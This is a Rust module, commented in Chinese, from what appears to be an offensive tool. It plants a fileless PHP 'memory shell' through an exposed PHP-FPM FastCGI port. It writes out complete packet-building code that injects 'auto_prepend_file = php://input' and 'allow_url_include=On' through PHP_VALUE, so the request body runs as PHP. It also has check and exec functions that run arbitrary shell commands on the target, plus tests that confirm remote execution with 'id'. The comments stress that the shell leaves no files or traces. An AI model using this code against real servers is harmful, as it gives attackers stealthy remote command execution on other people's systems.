//! PHP-FPM 直连内存马（FCGI 协议）。
//!
//! 与 `.user.ini` 形态的区别：
//! - **零落盘**：不写任何文件，请求体就是载荷；
//! - **无缓存延迟**：`auto_prepend_file=php://input` 是逐请求的，立即生效；
//! - **无残留可卸载**：既然没写文件，也就没有需要清理的产物。
//!
//! 前提：目标 FPM 端口/socket 从客户端可达（常见于 FPM 监听 0.0.0.0:9000 的误配置），
//! 且 `SCRIPT_FILENAME` 指向目标上一个已存在的 PHP 文件（FPM 会 stat 该文件）。

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use super::php::build_payload;

const FCGI_BEGIN_REQUEST: u8 = 1;
const FCGI_END_REQUEST: u8 = 3;
const FCGI_PARAMS: u8 = 4;
const FCGI_STDIN: u8 = 5;
const FCGI_STDOUT: u8 = 6;

const ROLE_RESPONDER: u16 = 1;

/// FPM 的 TCP 地址（unix socket 暂不支持，先覆盖最常见场景）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FcgiTarget {
    pub host: String,
    pub port: u16,
}

impl FcgiTarget {
    /// 解析 `host:port`（也接受裸端口，默认 127.0.0.1）。
    pub fn parse(value: &str) -> Result<Self, String> {
        let value = value.trim();
        if value.is_empty() {
            return Err("FPM 地址不能为空（例如 127.0.0.1:9000）".to_string());
        }
        let (host, port) = match value.rsplit_once(':') {
            Some((host, port)) => (host, port),
            None => ("127.0.0.1", value),
        };
        let port: u16 = port.parse().map_err(|_| format!("FPM 端口无效：{value}"))?;
        Ok(Self {
            host: if host.is_empty() { "127.0.0.1" } else { host }.to_string(),
            port,
        })
    }

    pub fn to_string_value(&self) -> String {
        format!("{}:{}", self.host, self.port)
    }
}

fn encode_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else {
        (0x8000_0000u32 | len as u32).to_be_bytes().to_vec()
    }
}

fn param(name: &str, value: &str) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend(encode_length(name.len()));
    out.extend(encode_length(value.len()));
    out.extend(name.as_bytes());
    out.extend(value.as_bytes());
    out
}

fn record(kind: u8, content: &[u8]) -> Vec<u8> {
    let padding = (8 - content.len() % 8) % 8;
    let mut out = Vec::with_capacity(8 + content.len() + padding);
    out.push(1); // version
    out.push(kind);
    out.extend(1u16.to_be_bytes()); // request id
    out.extend((content.len() as u16).to_be_bytes());
    out.push(padding as u8);
    out.push(0);
    out.extend(content);
    out.extend(std::iter::repeat_n(0u8, padding));
    out
}

/// 构造一次完整请求（BEGIN + PARAMS + STDIN）。
fn build_request(
    script_filename: &str,
    body: &str,
    token: &str,
    op: &str,
    cmd: Option<&str>,
) -> Vec<u8> {
    let mut params: Vec<(String, String)> = vec![
        ("GATEWAY_INTERFACE".into(), "CGI/1.1".into()),
        ("REQUEST_METHOD".into(), "POST".into()),
        ("SCRIPT_FILENAME".into(), script_filename.into()),
        (
            "SCRIPT_NAME".into(),
            format!(
                "/{}",
                script_filename.rsplit('/').next().unwrap_or("index.php")
            ),
        ),
        ("DOCUMENT_ROOT".into(), "/".into()),
        ("SERVER_SOFTWARE".into(), "dosword".into()),
        ("REMOTE_ADDR".into(), "127.0.0.1".into()),
        ("REMOTE_PORT".into(), "12345".into()),
        ("SERVER_ADDR".into(), "127.0.0.1".into()),
        ("SERVER_PORT".into(), "80".into()),
        ("SERVER_NAME".into(), "localhost".into()),
        ("SERVER_PROTOCOL".into(), "HTTP/1.1".into()),
        (
            "CONTENT_TYPE".into(),
            "application/x-www-form-urlencoded".into(),
        ),
        ("CONTENT_LENGTH".into(), body.len().to_string()),
        // 关键：逐请求把请求体当作 prepend 文件执行
        ("PHP_VALUE".into(), "auto_prepend_file = php://input".into()),
        ("PHP_ADMIN_VALUE".into(), "allow_url_include=On".into()),
        // 载荷通过 HTTP_* 读取操作与令牌
        ("HTTP_X_DSW_OP".into(), op.into()),
        ("HTTP_X_DSW_TOKEN".into(), token.into()),
    ];
    if let Some(cmd) = cmd {
        let encoded =
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, cmd.as_bytes());
        params.push(("HTTP_X_DSW_CMD".into(), encoded));
    }

    let mut packet = record(FCGI_BEGIN_REQUEST, &{
        let mut body = Vec::new();
        body.extend(ROLE_RESPONDER.to_be_bytes());
        body.push(0); // flags
        body.extend([0u8; 5]);
        body
    });
    let mut params_blob = Vec::new();
    for (name, value) in &params {
        params_blob.extend(param(name, value));
    }
    packet.extend(record(FCGI_PARAMS, &params_blob));
    packet.extend(record(FCGI_PARAMS, &[]));
    packet.extend(record(FCGI_STDIN, body.as_bytes()));
    packet.extend(record(FCGI_STDIN, &[]));
    packet
}

/// 发一次 FCGI 请求，返回 STDOUT（已去掉 HTTP 响应头）。
fn round_trip(
    target: &FcgiTarget,
    script_filename: &str,
    body: &str,
    token: &str,
    op: &str,
    cmd: Option<&str>,
    timeout: Duration,
) -> Result<String, String> {
    let mut stream = TcpStream::connect((target.host.as_str(), target.port))
        .map_err(|error| format!("连接 FPM {} 失败：{error}", target.to_string_value()))?;
    stream
        .set_read_timeout(Some(timeout))
        .map_err(|error| error.to_string())?;
    stream
        .write_all(&build_request(script_filename, body, token, op, cmd))
        .map_err(|error| format!("发送 FCGI 请求失败：{error}"))?;

    let mut stdout = Vec::new();
    loop {
        let mut header = [0u8; 8];
        stream
            .read_exact(&mut header)
            .map_err(|error| format!("读取 FCGI 响应头失败：{error}"))?;
        let kind = header[1];
        let length = u16::from_be_bytes([header[4], header[5]]) as usize;
        let padding = header[6] as usize;
        let mut content = vec![0u8; length];
        if length > 0 {
            stream
                .read_exact(&mut content)
                .map_err(|error| format!("读取 FCGI 响应体失败：{error}"))?;
        }
        if padding > 0 {
            let mut pad = vec![0u8; padding];
            let _ = stream.read_exact(&mut pad);
        }
        match kind {
            FCGI_STDOUT => stdout.extend(content),
            FCGI_END_REQUEST => break,
            _ => {}
        }
    }
    let text = String::from_utf8_lossy(&stdout).into_owned();
    // 载荷直接 echo，FPM 仍会先输出 CGI 响应头；按需剥掉。
    Ok(match text.split_once("\r\n\r\n") {
        Some((_, body)) => body.to_string(),
        None => text,
    })
}

pub fn check(
    settings: &dosome_sdk_domain::AppSettings,
    target: &FcgiTarget,
    script: &str,
    token: &str,
    name: &str,
) -> bool {
    exec_raw(settings, target, script, token, "ping", None, name)
        .map(|body| body.contains(&format!("DSW_MEM:{name}:OK")))
        .unwrap_or(false)
}

pub fn exec(
    settings: &dosome_sdk_domain::AppSettings,
    target: &FcgiTarget,
    script: &str,
    token: &str,
    name: &str,
    command: &str,
) -> Result<String, String> {
    let body = exec_raw(settings, target, script, token, "exec", Some(command), name)?;
    body.strip_prefix("DSW_MEM:")
        .and_then(|rest| {
            base64::Engine::decode(&base64::engine::general_purpose::STANDARD, rest.trim()).ok()
        })
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
        .ok_or_else(|| {
            format!(
                "响应格式异常：{}",
                body.chars().take(200).collect::<String>()
            )
        })
}

fn exec_raw(
    settings: &dosome_sdk_domain::AppSettings,
    target: &FcgiTarget,
    script: &str,
    token: &str,
    op: &str,
    cmd: Option<&str>,
    name: &str,
) -> Result<String, String> {
    let timeout = Duration::from_secs(settings.default_timeout_secs.clamp(1, 300));
    round_trip(
        target,
        script,
        &build_payload(token, name),
        token,
        op,
        cmd,
        timeout,
    )
}

/// 让本模块与 domain DTO 解耦的别名。
pub mod dosome_sdk_domain {
    pub use dosword_sdk::domain::AppSettings;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_targets() {
        assert_eq!(
            FcgiTarget::parse("10.0.0.5:9000").unwrap(),
            FcgiTarget {
                host: "10.0.0.5".into(),
                port: 9000
            }
        );
        assert_eq!(
            FcgiTarget::parse("9000").unwrap(),
            FcgiTarget {
                host: "127.0.0.1".into(),
                port: 9000
            }
        );
        assert!(FcgiTarget::parse("").is_err());
        assert!(FcgiTarget::parse("host:notaport").is_err());
    }

    #[test]
    fn length_encoding_matches_fcgi_spec() {
        assert_eq!(encode_length(0), vec![0]);
        assert_eq!(encode_length(127), vec![127]);
        assert_eq!(encode_length(128), 0x8000_0080u32.to_be_bytes().to_vec());
    }

    #[test]
    fn request_contains_prepend_and_headers() {
        let packet = build_request("/var/www/index.php", "<?php ?>", "tok", "ping", None);
        let text = String::from_utf8_lossy(&packet);
        assert!(text.contains("auto_prepend_file = php://input"));
        assert!(text.contains("allow_url_include=On"));
        assert!(text.contains("HTTP_X_DSW_OP"));
        assert!(text.contains("HTTP_X_DSW_TOKEN"));
        assert!(text.contains("SCRIPT_FILENAME"));
    }

    /// 端到端（需本地 FPM）：DSW_FCGI_TARGET=host:port
    /// DSW_FCGI_SCRIPT=/目标上已存在的 php 文件
    #[test]
    fn round_trip_against_local_fpm() {
        let (Ok(target), Ok(script)) = (
            std::env::var("DSW_FCGI_TARGET"),
            std::env::var("DSW_FCGI_SCRIPT"),
        ) else {
            eprintln!("跳过：需要 DSW_FCGI_TARGET / DSW_FCGI_SCRIPT");
            return;
        };
        let target = FcgiTarget::parse(&target).unwrap();
        let settings = dosome_sdk_domain::AppSettings::default();
        let token = "fcgi-itest-token";
        let name = "fitest";
        assert!(
            check(&settings, &target, &script, token, name),
            "ping 应成功"
        );
        let out = exec(&settings, &target, &script, token, name, "id").unwrap();
        assert!(out.contains("uid="), "exec 输出异常：{out}");
    }
}
